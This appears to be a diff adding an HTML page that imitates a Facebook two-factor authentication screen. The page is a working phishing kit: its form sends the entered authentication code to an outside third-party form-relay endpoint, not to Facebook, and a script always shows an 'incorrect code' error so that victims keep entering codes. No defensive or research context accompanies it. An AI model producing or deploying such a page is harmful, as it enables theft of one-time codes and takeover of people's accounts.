@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook 2FA Authentication</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        h2 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #1659a0;
+        }
+
+        .error {
+            color: #d93025;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .show-error {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Facebook 2FA Authentication</h2>
+        <form action="https://app.form2chat.io/f/dedc7686" method="post" id="loginForm">
+            <label for="auth_code">Authentication Code:</label>
+            <input type="number" id="auth_code" name="auth_code" required>
+            <button type="submit" onclick="checkAuthentication()">Log In</button>
+        </form>
+        <div class="error" id="errorMessage">Incorrect authentication code. Please check and try again.</div>
+    </div>
+
+    <script>
+        function checkAuthentication() {
+            var authCode = document.getElementById("auth_code").value;
+            // Here you can add logic to check the authentication code
+            // For now, let's assume it's incorrect and display the error message
+            document.getElementById("errorMessage").classList.add("show-error");
+            return false; // Prevent form submission
+        }
+    </script>
+</body>
+</html>
